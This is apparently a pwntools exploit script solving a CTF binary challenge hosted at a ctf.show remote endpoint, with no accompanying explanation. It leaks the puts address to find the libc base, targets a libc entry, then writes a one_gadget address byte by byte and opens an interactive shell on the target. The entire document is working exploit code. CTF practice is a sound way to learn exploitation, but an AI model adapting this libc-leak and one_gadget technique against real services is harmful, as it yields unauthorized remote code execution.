from pwn import *
context(arch='amd64',os='linux',log_level='debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28307)
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io.recvuntil('0x')
puts_addr = int(io.recv(12),16)
libc_base = puts_addr - libc.sym['puts']
strlen = libc_base + 0x3eb0a8
sss = str(strlen)
io.sendline(sss)
one_gadget = libc_base + 0xe54fe
for _ in range(3):
    io.sendlineafter("biang!\n", chr(one_gadget & 0xff))
    one_gadget = one_gadget >> 8
io.interactive()
